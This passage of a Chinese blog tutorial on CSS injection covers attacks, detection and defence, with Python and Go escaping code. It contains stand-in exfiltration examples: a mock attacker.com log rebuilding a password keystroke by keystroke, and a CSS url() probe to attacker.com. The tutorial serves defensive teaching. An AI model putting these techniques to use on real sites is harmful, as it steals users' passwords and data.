class="name">h1</span>&gt;</span>请登录<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 模拟用户输入实时绑定到 value 属性 (通常密码框不会这样做，但为了演示，这里模拟)</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> passwordInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;password&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        passwordInput.<span class="title function_">addEventListener</span>(<span class="string">&#x27;input&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 在实际场景中，input[value] 属性通常不会实时更新，</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 攻击者需要寻找其他可以实时反映用户输入，且会出现在 DOM 中的属性，</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 或者利用一些特殊的浏览器行为。</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 某些框架 (如 Angular/Vue) 的双向绑定可能导致 value 属性更新。</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 另一个常见攻击点是 CSS 中的 :focus 或 :hover 伪类。</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Password value:&quot;</span>, <span class="variable language_">this</span>.<span class="property">value</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 真实攻击中，这里的 console.log 不存在，攻击者只依赖 CSS 规则触发请求。</span></span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击者日志示例 (attacker.com&#x2F;log)</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">GET /log?key=p HTTP/1.1</span><br><span class="line">Host: attacker.com</span><br><span class="line"></span><br><span class="line">GET /log?key=a HTTP/1.1</span><br><span class="line">Host: attacker.com</span><br><span class="line"></span><br><span class="line">GET /log?key=s HTTP/1.1</span><br><span class="line">Host: attacker.com</span><br><span class="line"></span><br><span class="line">GET /log?key=s HTTP/1.1</span><br><span class="line">Host: attacker.com</span><br><span class="line"></span><br><span class="line">GET /log?key=w HTTP/1.1</span><br><span class="line">Host: attacker.com</span><br><span class="line"></span><br><span class="line">GET /log?key=o HTTP/1.1</span><br><span class="line">Host: attacker.com</span><br><span class="line"></span><br><span class="line">GET /log?key=r HTTP/1.1</span><br><span class="line">Host: attacker.com</span><br><span class="line"></span><br><span class="line">GET /log?key=d HTTP/1.1</span><br><span class="line">Host: attacker.com</span><br></pre></td></tr></table></figure>
+<p>通过观察这些请求，攻击者可以逐个字符地重构出受害者输入的密码 “password”。</p>
+<h3 id="2-2-页面篡改与钓鱼-Page-Defacement-Phishing"><a href="#2-2-页面篡改与钓鱼-Page-Defacement-Phishing" class="headerlink" title="2.2 页面篡改与钓鱼 (Page Defacement &amp; Phishing)"></a>2.2 页面篡改与钓鱼 (Page Defacement &amp; Phishing)</h3><p>攻击者可以使用注入的 CSS 来修改页面的视觉外观，隐藏、移动或重新定位元素，从而：</p>
+<ul>
+<li><strong>隐藏关键信息</strong>：使用 <code>display: none;</code> 隐藏登录页面上的安全提示或警告。</li>
+<li><strong>覆盖或替换内容</strong>：使用 <code>:before</code> &#x2F; <code>:after</code> 伪元素和 <code>content</code> 属性插入攻击者控制的文本或图片，或者通过 <code>position: absolute;</code> 将伪造的表单覆盖在原始表单之上，诱导用户输入敏感信息。</li>
+<li><strong>改变布局</strong>：将重要的按钮或链接移动到不显眼的位置，或者使页面无法正常使用。</li>
+</ul>
+<h3 id="2-3-信息探测-Information-Gathering"><a href="#2-3-信息探测-Information-Gathering" class="headerlink" title="2.3 信息探测 (Information Gathering)"></a>2.3 信息探测 (Information Gathering)</h3><p>虽然不如数据窃取直接，但 CSS 注入也可以用于收集关于用户或应用程序的信息：</p>
+<ul>
+<li><strong>探测用户是否访问过某个链接</strong>：利用 <code>a:visited</code> 伪类，虽然现代浏览器已经限制了 <code>a:visited</code> 的样式修改，以防止这种攻击，但历史版本或某些浏览器仍可能存在风险。</li>
+<li><strong>探测用户是管理员还是普通用户</strong>：如果应用程序根据用户角色添加特定的 CSS 类（例如 <code>&lt;body class=&quot;admin-user&quot;&gt;</code>），攻击者可以编写针对这些类的 CSS 规则，并在它们被触发时发送请求。</li>
+<li><strong>探测特定元素是否存在</strong>：通过 <code>div#some-element &#123; background-image: url(&#39;http://attacker.com/element_exists&#39;); &#125;</code> 来确认页面上是否存在某个特定 ID 的元素。</li>
+</ul>
+<h3 id="2-4-绕过-CSP-Content-Security-Policy-有限情况"><a href="#2-4-绕过-CSP-Content-Security-Policy-有限情况" class="headerlink" title="2.4 绕过 CSP (Content Security Policy) (有限情况)"></a>2.4 绕过 CSP (Content Security Policy) (有限情况)</h3><p>在某些配置不当或宽松的 CSP 下，CSS 注入可能可以用于绕过其安全防护。例如，如果 <code>style-src &#39;unsafe-inline&#39;</code> 被允许，但 <code>script-src</code> 没有，那么攻击者可能无法直接执行 JavaScript。然而，通过上面描述的数据窃取技术，攻击者依然可以获取敏感数据。</p>
+<h3 id="2-5-UI-重绘-点击劫持-UI-Redressing-Clickjacking"><a href="#2-5-UI-重绘-点击劫持-UI-Redressing-Clickjacking" class="headerlink" title="2.5 UI 重绘&#x2F;点击劫持 (UI Redressing&#x2F;Clickjacking)"></a>2.5 UI 重绘&#x2F;点击劫持 (UI Redressing&#x2F;Clickjacking)</h3><p>通过精确地操纵元素的 <code>top</code>, <code>left</code>, <code>width</code>, <code>height</code>, <code>opacity</code>, <code>z-index</code> 属性，攻击者可以将透明的恶意元素叠加在受害者页面的关键按钮或链接之上，诱骗用户点击。</p>
+<h2 id="三、CSS-注入的识别与检测"><a href="#三、CSS-注入的识别与检测" class="headerlink" title="三、CSS 注入的识别与检测"></a>三、CSS 注入的识别与检测</h2><ol>
+<li><strong>人工代码审计 (Manual Code Review)</strong>：<br>审查所有用户输入可能接触到 HTML <code>&lt;style&gt;</code> 标签、<code>style</code> 属性或直接作为 CSS 属性值的地方。特别关注那些在 HTML 模板中直接插入用户输入且未进行上下文敏感编码的位置。</li>
+<li><strong>SAST (Static Application Security Testing) 工具</strong>：<br>部分 SAST 工具能够检测到将用户输入直接渲染到这些敏感位置的代码模式。</li>
+<li><strong>DAST (Dynamic Application Security Testing) 工具</strong>：<br>通过模糊测试 (Fuzzing) 输入，向应用程序发送包含恶意 CSS 片段的请求，然后分析响应，看是否产生了非预期的样式变化或外部 HTTP 请求。</li>
+<li><strong>Content Security Policy (CSP) Reporting</strong>：<br>如果配置了 CSP 的报告模式，当注入的 CSS 尝试加载外部资源时，可能会触发 CSP 报告，帮助发现这类攻击。</li>
+</ol>
+<h2 id="四、CSS-注入的防御策略"><a href="#四、CSS-注入的防御策略" class="headerlink" title="四、CSS 注入的防御策略"></a>四、CSS 注入的防御策略</h2><p>防御 CSS 注入的最核心原则是<strong>对所有用户提供的，要插入到 HTML 或 CSS 上下文中的数据进行严格的上下文敏感编码或白名单清理。</strong></p>
+<h3 id="4-1-输出编码-转义-Output-Encoding-Escaping"><a href="#4-1-输出编码-转义-Output-Encoding-Escaping" class="headerlink" title="4.1 输出编码&#x2F;转义 (Output Encoding&#x2F;Escaping)"></a>4.1 输出编码&#x2F;转义 (Output Encoding&#x2F;Escaping)</h3><p>这是防御 CSS 注入最关键的措施。根据数据插入的位置选择合适的编码方式：</p>
+<ul>
+<li><p><strong>HTML 上下文转义</strong>：<br>当用户输入将要插入到 HTML 标签的内容或属性值中（而非 <code>style</code> 属性内）时，需要进行 HTML 实体编码。但这并不能直接防御 CSS 注入本身，主要是防止 XSS。</p>
+<ul>
+<li><strong>Python 示例</strong>：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line">user_input = <span class="string">&quot;&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;&quot;</span></span><br><span class="line">encoded_input = html.escape(user_input) <span class="comment"># &amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;);&amp;lt;/script&amp;gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><strong>Go 示例</strong>：<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;html&quot;</span></span><br><span class="line"></span><br><span class="line">userInput := <span class="string">&quot;&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;&quot;</span></span><br><span class="line">encodedInput := html.EscapeString(userInput) <span class="comment">// &amp;lt;script&amp;gt;alert(&amp;#39;XSS&amp;#39;);&amp;lt;/script&amp;gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><strong>CSS 上下文转义</strong>：<br>当用户输入将要作为 CSS 规则的一部分（例如在 <code>&lt;style&gt;</code> 标签内或 <code>style</code> 属性中作为值）时，需要进行 CSS 编码。这通常意味着将非字母数字字符转义为像 <code>\xx</code> 或 <code>\uxxxx</code> 这样的格式。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 原始 CSS */</span></span><br><span class="line"><span class="selector-class">.user-class</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">color</span>: &#123;&#123; user_input &#125;&#125; ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 假设 user_input = &#x27;red; &#125; .malicious &#123; color: blue;&#x27; */</span></span><br><span class="line"><span class="comment">/* 攻击者想要的：</span></span><br><span class="line"><span class="comment">.user-class &#123;</span></span><br><span class="line"><span class="comment">    width: 100px;</span></span><br><span class="line"><span class="comment">    color: red;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">.malicious &#123;</span></span><br><span class="line"><span class="comment">    color: blue;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* 防御后的输出：</span></span><br><span class="line"><span class="comment">.user-class &#123;</span></span><br><span class="line"><span class="comment">    width: 100px;</span></span><br><span class="line"><span class="comment">    color: red\3B\20\7D\20\2E\6D\61\6C\69\63\69\6F\75\73\20\7B\20\63\6F\6C\6F\72\3A\20\62\6C\75\65\3B;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Python 示例 (需要自定义函数或第三方库，Python标准库没有直接的 CSS 转义函数)</strong>：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">css_escape</span>(<span class="params">s</span>):</span><br><span class="line">    escaped_chars = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;9&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;a&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;z&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;A&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            escaped_chars.append(char)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            escaped_chars.append(<span class="string">f&#x27;\\<span class="subst">&#123;<span class="built_in">ord</span>(char):x&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(escaped_chars)</span><br><span class="line"></span><br><span class="line">user_input_css = <span class="string">&quot;red; &#125; .malicious &#123; color: blue;&quot;</span></span><br><span class="line">escaped_css = css_escape(user_input_css)</span><br><span class="line"><span class="built_in">print</span>(escaped_css)</span><br><span class="line"><span class="comment"># 输出: red\3b \7d \20 \2e \6d \61 \6c \69 \63 \69 \6f \75 \73 \20 \7b \20 \63 \6f \6c \6f \72 \3a \20 \62 \6c \75 \65 \3b</span></span><br></pre></td></tr></table></figure></li>
+<li><strong>Go 示例 (同样需要自定义函数或第三方库)</strong>：<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">cssEscape</span><span class="params">(s <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> escapedChars []<span class="type">rune</span></span><br><span class="line">	<span class="keyword">for</span> _, r := <span class="keyword">range</span> s &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="string">&#x27;0&#x27;</span> &lt;= r &amp;&amp; r &lt;= <span class="string">&#x27;9&#x27;</span>) || (<span class="string">&#x27;a&#x27;</span> &lt;= r &amp;&amp; r &lt;= <span class="string">&#x27;z&#x27;</span>) || (<span class="string">&#x27;A&#x27;</span> &lt;= r &amp;&amp; r &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">			escapedChars = <span class="built_in">append</span>(escapedChars, r)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			escapedChars = <span class="built_in">append</span>(escapedChars, <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">			escapedChars = <span class="built_in">append</span>(escapedChars, []<span class="type">rune</span>(strconv.FormatInt(<span class="type">int64</span>(r), <span class="number">16</span>))...)</span><br><span class="line">			escapedChars = <span class="built_in">append</span>(escapedChars, <span class="string">&#x27; &#x27;</span>) <span class="comment">// CSS escape should include a space if next char is hex digit</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="type">string</span>(escapedChars)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	userInputCSS := <span class="string">&quot;red; &#125; .malicious &#123; color: blue;&quot;</span></span><br><span class="line">	escapedCSS := cssEscape(userInputCSS)</span><br><span class="line">	fmt.Println(escapedCSS)</span><br><span class="line">	<span class="comment">// 输出: red\3b \7d \2e \6d \61 \6c \69 \63 \69 \6f \75 \73 \7b \63 \6f \6c \6f \72 \3a \62 \6c \75 \65 \3b</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h3 id="4-2-清理-白名单-Sanitization-Whitelisting"><a href="#4-2-清理-白名单-Sanitization-Whitelisting" class="headerlink" title="4.2 清理&#x2F;白名单 (Sanitization&#x2F;Whitelisting)"></a>4.2 清理&#x2F;白名单 (Sanitization&#x2F;Whitelisting)</h3><p>如果必须允许用户输入包含一些 HTML 或 CSS，则应该采取白名单策略。只允许已知安全的标签、属性和 CSS 属性&#x2F;值。</p>
+<ul>
+<li><strong>HTML 清理</strong>：使用专业的 HTML 清理库（如 Java 的 Jsoup，Python 的 Bleach 或 DOMPurify.js (前端)），只保留白名单中的 HTML 标签和属性，移除其他所有内容。</li>
+<li><strong>CSS 清理</strong>：如果允许用户自定义 CSS，则需要一个 CSS 解析器来检查并只允许白名单中的 CSS 属性和值。绝不允许用户输入改变 CSS 规则的结构。</li>
+</ul>
+<h3 id="4-3-内容安全策略-Content-Security-Policy-CSP"><a href="#4-3-内容安全策略-Content-Security-Policy-CSP" class="headerlink" title="4.3 内容安全策略 (Content Security Policy, CSP)"></a>4.3 内容安全策略 (Content Security Policy, CSP)</h3><p>CSP 是一种防御纵深机制，虽然不能完全阻止 CSS 注入，但可以限制其危害。</p>
+<ul>
+<li><code>style-src</code>：限制可以加载样式表的来源（例如 <code>style-src &#39;self&#39; https://trusted.cdn.com;</code>）。</li>
+<li><strong>避免 <code>&#39;unsafe-inline&#39;</code></strong>：尽量不要在 <code>style-src</code> 中使用 <code>&#39;unsafe-inline&#39;</code>，因为它允许页面中的任意内联样式，这为 CSS 注入打开了大门。如果必须使用，应确保所有内联样式都经过严格的编码或清理。</li>
+</ul>
+<h3 id="4-4-输入验证-Input-Validation"><a href="#4-4-输入验证-Input-Validation" class="headerlink" title="4.4 输入验证 (Input Validation)"></a>4.4 输入验证 (Input Validation)</h3><p>在服务器端，对用户输入进行严格的验证。根据预期的输入类型，限制其长度、格式和允许的字符集。<br>例如，如果期望一个颜色值，就只接受有效的颜色格式（如 <code>red</code> 或 <code>#FFFFFF</code> 或 <code>rgb(0,0,0)</code>），而不是任意字符串。</p>
+<h3 id="4-5-最小权限原则"><a href="#4-5-最小权限原则" class="headerlink" title="4.5 最小权限原则"></a>4.5 最小权限原则</h3><p>如果业务功能允许，尽可能避免让用户控制任何样式输出。如果必须提供这种灵活性，则应将其限制在最小的功能集内，并结合上述所有防御措施。</p>
+<h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>CSS 注入是一种复杂且常常被忽视的客户端漏洞。虽然它不像 XSS 那样直接执行 JavaScript，但它可以利用 CSS 本身的强大功能，实现页面篡改、敏感信息窃取（如键盘记录密码）、用户行为监控等多种危害。</p>
+<p>防御 CSS 注入的关键在于：</p>
+<ol>
+<li><strong>上下文敏感的输出编码</strong>：根据用户输入被插入到 HTML 或 CSS 上下文，选择正确的编码方式。CSS 上下文的编码尤其重要和复杂。</li>
+<li><strong>严格的输入验证和白名单清理</strong>：在服务器端对用户输入进行验证，只允许已知安全的输入。</li>
+<li><strong>内容安全策略 (CSP) 作为纵深防御</strong>：虽然不是主要防御，但可以限制攻击的范围和冲击。</li>
+</ol>
+<p>开发者在处理任何用户输入并将其渲染到页面时，都应保持高度警惕，始终假设用户输入是恶意的，并采取适当的防御措施。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.tbf1211.xx.kg">TeaTang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://blog.tbf1211.xx.kg/7420d7912dc7/">https://blog.tbf1211.xx.kg/7420d7912dc7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://blog.tbf1211.xx.kg" target="_blank">1024 维度</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/2025/">2025</a></div><div class="post-share"><div class="social-share" data-image="/img/cover/default_cover-13.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/b25babd84514/" title="Vue3 defineModel详解"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-05.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Vue3 defineModel详解</div></div><div class="info-2"><div class="info-item-1"> defineModel 是 Vue 3.4 版本中引入的一个新的宏 (macro)，旨在简化组件中双向绑定 v-model 的实现。在 Composition API 的 setup 语法糖 (&lt;script setup&gt;) 中使用时，它极大地减少了为组件实现 v-model 所需的样板代码，使其更加直观和便捷。  核心思想：defineModel 是 defineProps 和 defineEmits 的语法糖，它声明了一个可双向绑定的 props，并自动处理了 modelValue prop 的接收和相应的 update:modelValue 事件的触发，让自定义组件的 v-model 用法变得和原生表单元素一样简洁。   一、为什么需要 defineModel？在 defineModel 出现之前，如果你想在 Vue 3 的自定义组件中实现 v-model 双向绑定，你需要手动完成以下步骤：  通过 defineProps 声明一个名为 modelValue 的 prop 来接收父组件传递的值。 通过 defineEmits 声明一个名为 update:mod...</div></div></div></a><a class="pagination-related" href="/c1538f7d98a1/" title="DevOps 深度解析"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-32.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">DevOps 深度解析</div></div><div class="info-2"><div class="info-item-1"> DevOps 是一种文化理念、一套实践和一套工具的集合，旨在缩短系统开发生命周期，同时高质量、持续不断地交付软件。它强调开发 (Development) 团队与运维 (Operations) 团队之间的协作与沟通，通过自动化流程、持续反馈和共享责任，打破传统上这两个团队之间的壁垒。  核心思想：DevOps 不仅仅是工具链，更是一种文化转型。它关注整个软件交付价值流的优化，从构思到最终用户，实现快速、可靠、高质量的软件交付。   一、为什么需要 DevOps？在传统的软件开发模式中（如瀑布模型），开发和运维团队通常是分离的，各自有不同的目标和激励机制：  开发团队：追求快速迭代、新功能发布，偏好频繁变更。 运维团队：追求系统稳定、高可用性，偏好减少变更。  这种分离导致了许多问题：  “推诿墙” (Wall of Confusion)：开发和运维之间缺乏沟通和协作，导致部署和维护阶段出现大量冲突和瓶颈。 发布周期长：软件从开发完成到最终上线需要漫长的测试、部署和配置过程。 部署风险高：由于变更频率低且批次大，每次发布都可能带来巨大的风险。 反馈回路慢：问题发现到解决的周期长，难...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/1c9fa79b93e5/" title="Msfvenom 详解"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-13.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-26</div><div class="info-item-2">Msfvenom 详解</div></div><div class="info-2"><div class="info-item-1"> Msfvenom 是 Metasploit 框架中的一个强大而独立的命令行工具，它结合了 msfpayload（载荷生成器）和 msfencode（编码器）的功能，旨在生成各种格式的恶意载荷（Payload）并对其进行编码，以规避安全检测。它是渗透测试人员和红队成员创建自定义后门和绕过防御机制的利器。  核心思想：将攻击载荷（Shellcode）和输出格式（如 EXE、ELF、ASPX 等）分离，允许用户自由组合并按需编码，生成高度定制化的恶意文件。   一、Msfvenom 简介1.1 什么是 Msfvenom？msfvenom 是一个命令行工具，属于 Metasploit Framework 的一部分。它的主要功能是：  载荷生成 (Payload Generation)：创建各种操作系统（Windows, Linux, macOS, Android 等）和架构（x86, x64 等）的恶意载荷。 编码 (Encoding)：对生成的载荷进行编码，以尝试绕过杀毒软件的签名检测或处理特殊字符（如 NUL \x00）。 格式化 (Formatting)：将生成的载荷输出为多种文...</div></div></div></a><a class="pagination-related" href="/c58da3f1e952/" title="SSDLC (安全软件开发生命周期) 详解"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-03.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-03</div><div class="info-item-2">SSDLC (安全软件开发生命周期) 详解</div></div><div class="info-2"><div class="info-item-1"> SSDLC (Secure Software Development Life Cycle，安全软件开发生命周期) 是一种将安全实践和活动集成到整个软件开发生命周期 (SDLC) 各个阶段的方法。它旨在从项目启动到软件部署和维护的每一个环节，系统地识别、缓解和消除软件漏洞，确保构建出本质上更安全的应用程序。  传统的软件开发往往将安全性视为一个后期添加的特性或“事后”的活动，导致在开发后期才发现大量安全缺陷，修复成本高昂，甚至可能导致项目延期。SSDLC 强调“安全左移 (Shift-Left Security)”理念，这意味着安全工作应尽早开始，贯穿整个开发过程，而不是仅在代码编写完成后进行安全测试。   一、为什么需要 SSDLC？在数字化转型的浪潮中，软件已成为业务的核心驱动力，但随之而来的安全风险也日益凸显。传统 SDLC 面临以下安全挑战：  后期发现的漏洞成本高昂：在生产环境中发现的漏洞，其修复成本可能是设计阶段发现的几十甚至上百倍。这包括重新编码、测试、部署，甚至可能面临经济损失和品牌损害。 快速迭代下的安全风险累积：DevOps 和敏捷开发模式强调快速交付，如果...</div></div></div></a><a class="pagination-related" href="/08a7bab723f9/" title="Metasploit exploit&#x2F;multi&#x2F;handler 模块详解"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-14.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-14</div><div class="info-item-2">Metasploit exploit&#x2F;multi&#x2F;handler 模块详解</div></div><div class="info-2"><div class="info-item-1"> exploit/multi/handler 是 Metasploit 框架中一个极其重要且应用广泛的模块。它本身并不是一个漏洞利用模块，而是一个通用的监听器（Listener），用于接收由 Metasploit 或 msfvenom 生成的各种 Payload 发起的反向连接（Reverse Shell）。它提供了一个灵活且强大的平台，用于管理渗透测试过程中获取的 Shell 会话，特别是 Meterpreter 会话。  